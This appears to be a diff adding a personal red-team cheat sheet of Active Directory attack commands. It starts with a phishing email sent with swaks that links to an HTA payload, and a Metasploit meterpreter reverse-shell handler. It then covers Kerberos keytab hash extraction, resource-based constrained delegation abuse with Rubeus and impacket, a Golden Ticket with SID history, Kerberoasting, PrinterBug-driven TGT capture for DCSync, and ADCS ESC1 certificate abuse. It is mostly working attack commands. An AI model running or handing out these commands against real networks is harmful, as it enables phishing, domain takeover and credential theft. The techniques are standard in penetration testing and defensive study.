@@ -1,0 +1,140 @@
+swaks --body 'Please click here http://192.168.x.y/mail.hta' --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" --header "Subject: Isues with Mail" -t target@gmail.com -f admin@target.local --server 192.168.x.y
+
+
+Msfconsole to ProxySetups:
+msfconsole -x 'use auxiliary/server/socks4a; set SRVPORT 1080; set SRVHOST 127.0.0.1; run -j; use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 192.168.x.y; set lport 443; set AutoRunScript "autoroute -s 172.16.x.0/24"; run'
+
+
+/etc/krb4.keytab:
+
+1. Python3 keytabextract.py krb5.keytab --> we will et the hash
+ccache file:
+export KRB5CCNAME = /tmp/hrb5data.ccache
+python3 GETADUsers.py -all -k -no-pass -dc-ip 172.101.01.11 domain.local/user
+python3 psexec.py -k -no-pass -target-ip 172.16.x.12 -dc-ip 172.16.x.12
+
+
+proxt setup through sshuttle:
+sshuttle -v -e "ssh -i id_rsa" -r root@ip  172.0.10.0/24
+
+RBCD:
+
+1.Add machine account
+
+From Windows:
+New-MachineAccount -MachineAccount baud -Password $(ConvertTo-SecureString 'Baudy16!1' -AsPlainText -Force)
+Set-ADComputer its-dc1 -PrincipalsAllowedToDelegateToAccount baud$
+Get-ADComputer its-dc1 -Properties PrincipalsAllowedToDelegateToAccount
+
+PowerView:
+# obtain SID
+Get-DomainComputer baud
+# build security descriptor
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3543871144-676301019-4006120668-1166)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+# modify the target computer attribute
+Get-DomainComputer its-dc1 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+
+
+
+# get AES:
+Rubeus.exe hash /password:Baudy16!1 /user:baud$ /domain:its-piemonte.local
+# get only RC4:
+Rubeus.exe hash /password:Baudy16!1
+
+Rubeus.exe s4u /user:baud$ /rc4:8F8172E42D04C1934FECC9E8404E2657 /domain:its-piemonte.local /msdsspn:cifs/its-dc1 /impersonateuser:administrator /ptt
+
+
+From Linux:
+impacket-addcomputer -computer-name 'rbcd-test$' -computer-pass 'Megaman!1' -dc-ip 192.168.0.100 its-piemonte.local/tantani:'AAAAaaaa!1'
+
+impacket-rbcd -delegate-to 'its-dc1$' -delegate-from 'rbcd-test$' -dc-ip 192.168.0.100 -action write its-piemonte/tantani:'AAAAaaaa!1'
+impacket-getST -spn cifs/its-dc1.its-piemonte.local -impersonate Administrator -dc-ip 192.168.0.100 its-piemonte.local/rbcd-test:'Megaman!1'
+
+Bloodhound:
+.\SharpHound.exe -c All --domain corp.target.local --zipfilename output.zip
+
+Now craft a Golden Ticket with the Enterprise Admins SID from the parent domain injected into SID History:
+
+# Get the SID of the parent domain's Enterprise Admins group
+Get-DomainGroup "Enterprise Admins" -Domain corp.local | Select-Object objectsid
+
+# Craft the Golden Ticket with SID History (Mimikatz)
+kerberos::golden /user:Administrator /domain:child.corp.local /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<ENTERPRISE_ADMINS_SID> /ptt
+# Verify access
+dir \\dc.corp.local\c$
+
+
+Kerberoasting Across Trusts
+Kerberoasting is not limited to the current domain. If a trust allows TGT delegation or if service accounts exist in trusted domains, they can be targeted from a foothold in the trusting domain.
+
+# Enumerate SPNs in a trusted domain
+Get-DomainUser -SPN -Domain trusted.corp.local
+
+# Request a service ticket for a cross-domain SPN
+Get-DomainSPNTicket -Domain trusted.corp.local -OutputFormat Hashcat
+
+Crack the resulting hash offline:
+
+hashcat -a 0 -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
+
+nconstrained Delegation and Trust Abuse
+Unconstrained delegation is a legacy AD feature that causes DCs or servers to store TGTs for any user that authenticates to them. When combined with trust relationships, this becomes critical.
+
+Finding Unconstrained Delegation Hosts
+# Find computers with unconstrained delegation
+Get-DomainComputer -Unconstrained -Domain corp.local | Select-Object dnshostname, useraccountcontrol
+
+# Find users with unconstrained delegation (rare but dangerous)
+Get-DomainUser -AllowDelegation -AdminCount
+Copy Code
+
+Abusing Unconstrained Delegation with PrinterBug
+The PrinterBug (MS-RPRN abuse) forces a remote machine to authenticate back to your controlled host. If you control a machine with unconstrained delegation, you can capture the DC's TGT:
+
+# On the attacking machine with unconstrained delegation, monitor for incoming TGTs
+.\Rubeus.exe monitor /interval:5 /filteruser:ParentDC$
+
+# On another session, trigger the PrinterBug against the parent domain DC
+.\SpoolSample.exe \\parentdc.corp.local \\compromisedhost.child.corp.local
+Copy Code
+
+Once the parent DC's TGT lands on your machine, use it for a DCSync attack:
+
+.\Rubeus.exe ptt /ticket:<base64_TGT>
+lsadump::dcsync /domain:corp.local /user:corp\Administrator
+
+
+
+Cross-Forest Attack Techniques
+Forest trusts present unique challenges because SID filtering is enforced by default. However, several techniques still work.
+
+Foreign Group Membership Enumeration
+Users from a trusted forest can be members of groups in the trusting forest. These relationships are often overlooked during access reviews:
+
+# Find users from a foreign domain who are members of local groups
+Get-DomainForeignGroupMember -Domain corp.local
+
+# Find local group memberships for foreign domain users
+Get-DomainForeignUser -Domain corp.local
+Copy Code
+
+ADCS Abuse Across Trusts
+Active Directory Certificate Services (ADCS) misconfigurations can be exploited across forest trusts. If a Certificate Authority is accessible from a trusting domain, ESC1 through ESC8 vulnerabilities may still apply.
+
+# Run Certify from a foothold in the trusting domain
+.\Certify.exe find /vulnerable /domain:corp.local
+
+# If ESC1 exists, request a certificate as a high-privileged user
+.\Certify.exe request /ca:corp.local\corp-CA /template:VulnerableTemplate /altname:Administrator
+Copy Code
+
+Convert the certificate and use it with Rubeus for a full PKINIT authentication:
+
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+.\Rubeus.exe asktgt /user:Administrator /domain:corp.local /certificate:cert.pfx /password:pass /ptt
+
+
+
+
